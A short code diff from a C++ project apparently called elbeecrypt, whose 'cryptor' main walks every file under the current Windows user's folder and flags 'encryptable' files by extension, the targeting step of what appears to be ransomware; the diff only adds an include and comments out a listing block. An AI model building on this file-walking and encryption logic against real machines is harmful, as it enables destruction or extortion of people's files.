@@ -5,6 +5,7 @@
 #include "elbeecrypt/cryptor/main.hpp"
 
 #include <sodium.h>
+#include <typeinfo>
 
 #include "elbeecrypt/common/io/direntwalk.hpp"
 #include "elbeecrypt/common/targets/extensions.hpp"
@@ -62,6 +63,7 @@ int main(int argc, char **argv){
 	std::string uname(getenv("username"));
 	common::io::DirentWalk::walk(fs::path("C:\\Users\\" + uname), fileConsumer, folderConsumer);
 
+	/*
 	vector<fs::path> paths = {};
 
 	common::io::DirentWalk::directoryList("C:\\Users\\", paths);
@@ -73,6 +75,7 @@ int main(int argc, char **argv){
 			std::cout << "Found encryptable file at " << path << std::endl;
 		}
 	}
+	*/
 }
 
 /** Impl of safetyNet(). */
